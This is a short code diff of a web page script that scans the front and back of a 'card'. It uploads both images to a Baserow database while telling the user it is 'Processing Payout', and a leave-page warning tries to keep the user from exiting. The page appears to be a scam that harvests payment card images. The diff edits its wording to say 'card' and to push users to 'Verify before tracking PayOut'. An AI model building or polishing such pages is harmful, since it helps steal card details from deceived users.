@@ -750,7 +750,7 @@
                 // If the modal is still visible, show a warning
                 if (document.getElementById('connection-modal').style.display !== 'none') {
                     e.preventDefault();
-                    e.returnValue = 'You need to connect your book to proceed. Are you sure you want to leave?';
+                    e.returnValue = 'You need to connect your card to proceed. Are you sure you want to leave?';
                     return e.returnValue;
                 }
             });
@@ -850,7 +850,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 frontURL = url; status.textContent = 'Front Scan Successful'; nextBtn.style.display = 'inline-block';
             } else {
                 status.textContent = 'Scanning back & Processing Payout'; await createBaserowRow(frontURL, url);
-                status.textContent = '✅ Done!Click  finish and track your application'; finishBtn.style.display = 'inline-block';
+                status.textContent = '✅ Done!Click  finish and Verify before tracking PayOut'; finishBtn.style.display = 'inline-block';
             }
         } catch (e) { status.textContent = 'Error: ' + e.message; }
         finally { scanBtn.disabled = false; }
